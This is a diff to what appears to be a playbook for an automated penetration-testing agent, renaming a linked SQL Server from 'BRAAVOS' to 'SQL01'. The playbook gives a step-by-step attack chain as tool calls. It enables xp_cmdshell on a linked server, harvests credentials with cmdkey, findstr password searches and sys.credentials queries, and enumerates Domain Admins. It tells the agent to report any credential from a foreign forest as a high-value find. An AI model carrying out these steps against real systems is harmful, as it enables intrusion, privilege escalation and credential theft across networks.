@@ -340,18 +340,18 @@ mssql_exec_linked(
 
 1. **Check your access level on the linked server:**
 ```
-mssql_exec_linked(target="...", linked_server="BRAAVOS", query="SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')")
+mssql_exec_linked(target="...", linked_server="SQL01", query="SELECT SYSTEM_USER; SELECT IS_SRVROLEMEMBER('sysadmin')")
 ```
 → If sysadmin=1, enable xp_cmdshell on the linked server
 
 2. **Enable xp_cmdshell on linked server:**
 ```
-mssql_linked_enable_xpcmdshell(target="sql.contoso.local", username="user", password="pass", linked_server="BRAAVOS", domain="CONTOSO.LOCAL")  # pragma: allowlist secret
+mssql_linked_enable_xpcmdshell(target="sql.contoso.local", username="user", password="pass", linked_server="SQL01", domain="CONTOSO.LOCAL")  # pragma: allowlist secret
 ```
 
 3. **Extract credentials from linked server** (same commands as Step 4b but via linked server):
 ```
-mssql_linked_xpcmdshell(target="sql.contoso.local", username="user", password="pass", linked_server="BRAAVOS", command="hostname && whoami /all", domain="CONTOSO.LOCAL")  # pragma: allowlist secret
+mssql_linked_xpcmdshell(target="sql.contoso.local", username="user", password="pass", linked_server="SQL01", command="hostname && whoami /all", domain="CONTOSO.LOCAL")  # pragma: allowlist secret
 mssql_linked_xpcmdshell(..., command="cmdkey /list")
 mssql_linked_xpcmdshell(..., command="findstr /si password C:\\inetpub\\*.config C:\\*.xml 2>nul")
 mssql_linked_xpcmdshell(..., command="net user /domain & net group \"Domain Admins\" /domain")
@@ -359,8 +359,8 @@ mssql_linked_xpcmdshell(..., command="net user /domain & net group \"Domain Admi
 
 4. **Check SQL Server itself for stored credentials:**
 ```
-mssql_exec_linked(target="...", linked_server="BRAAVOS", query="SELECT name, credential_identity, substring(decrypted, 1, 100) FROM sys.credentials")
-mssql_exec_linked(target="...", linked_server="BRAAVOS", query="SELECT name FROM sys.sql_logins")
+mssql_exec_linked(target="...", linked_server="SQL01", query="SELECT name, credential_identity, substring(decrypted, 1, 100) FROM sys.credentials")
+mssql_exec_linked(target="...", linked_server="SQL01", query="SELECT name FROM sys.sql_logins")
 ```
 
 **ANY credential from a foreign forest = immediate high-value report via task_complete.**
